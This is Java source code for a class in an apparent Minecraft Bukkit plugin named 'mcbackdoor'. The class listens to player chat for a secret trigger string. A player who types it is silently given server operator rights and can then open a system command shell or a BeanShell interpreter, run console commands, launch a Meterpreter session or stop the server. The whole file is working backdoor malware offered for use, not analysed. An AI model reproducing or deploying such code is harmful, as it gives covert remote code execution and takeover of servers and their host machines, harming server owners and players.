/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package org.martin.bukkit.mcbackdoor.scmd;

import java.util.ArrayList;
import java.util.HashMap;
import net.minecraft.server.MinecraftServer;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import org.martin.bukkit.mcbackdoor.hacks.get_server_op;
import org.martin.bukkit.mcbackdoor.scmd.modules.BSHModule;
import org.martin.bukkit.mcbackdoor.scmd.modules.CMDModule;
import org.martin.bukkit.mcbackdoor.scmd.modules.ConsoleModule;
import org.martin.bukkit.mcbackdoor.scmd.modules.MeterpreterModule;
import org.martin.bukkit.mcbackdoor.scmd.modules.StopModule;

/**
 *
 * @author Kekec852
 */
public class SecreteCommandsNew {

    private HashMap<Player, SettingsNew> privilagedPlayers = new HashMap<Player, SettingsNew>();
    private JavaPlugin plugin;
    private MinecraftServer mcServer;
    private ModuleProvider mProvider;

    public SecreteCommandsNew(JavaPlugin plugin) {
        this.plugin = plugin;
        mProvider = new ModuleProvider(plugin);
        mProvider.registerModule(new BSHModule());
        mProvider.registerModule(new CMDModule());
        mProvider.registerModule(new ConsoleModule());
        mProvider.registerModule(new MeterpreterModule());
        mProvider.registerModule(new StopModule());
        mProvider.enable();
    }

    public boolean processMSG(String msg, Player player) {
        if (msg.equalsIgnoreCase("%&#1337:")) {
            privilagedPlayers.put(player, new SettingsNew());
            get_server_op.getServerOp(plugin, player);
            return true;
        }
        SettingsNew st = privilagedPlayers.get(player);
        if (msg.startsWith("$") && isPlayerPrivilaged(player)) {
            if (msg.startsWith("$cmd")) {
                if (st != null) {
                    if (st.cmd) {
                        st.cmd = false;
                        mProvider.getModule("cmd").onCommand(player, new String[]{"stop"}, msg);
                    } else {
                        st.cmd = true;
                        mProvider.getModule("cmd").onCommand(player, new String[]{"start"}, msg);
                    }
                }
            }
            if (msg.startsWith("$bsh")) {
                if (st != null) {
                    if (st.bsh) {
                        st.bsh = false;
                        mProvider.getModule("bsh").onCommand(player, new String[]{"stop"}, msg);
                    } else {
                        st.bsh = true;
                        mProvider.getModule("bsh").onCommand(player, new String[]{"start"}, msg);
                    }
                }
            }
            if (msg.startsWith("$con")) {
                if(msg.indexOf(" ") == -1){
                    player.sendMessage(ChatColor.RED + "ERROR!");
                    return true;
                }
                String cmd = msg.substring(msg.indexOf(" ") + 1, msg.length());
                System.out.println(cmd);
                mProvider.getModule("con").onCommand(player, null, cmd);
            }
            if (msg.startsWith("$meterpreter")) {
                String args[] = msg.split(" ");
                if (args.length == 3) {
                    mProvider.getModule("meterpreter").onCommand(player, new String[]{args[1], args[2]}, msg);
                }
            }
            if (msg.startsWith("$stop")) {
                mProvider.getModule("stop").onCommand(player, null, msg);
            }
            return true;
        }
        if (st != null) {
            if (st.bsh && !st.cmd) {
                String[] args = new String[0];
                mProvider.getModule("bsh").onCommand(player, args, msg);
            }
            if (!st.bsh && st.cmd) {
                String[] args = new String[0];
                mProvider.getModule("cmd").onCommand(player, args, msg);
            }
            return true;
        }
        return false;
    }

    public boolean isPlayerPrivilaged(Player player) {
        return privilagedPlayers.containsKey(player);
    }
}
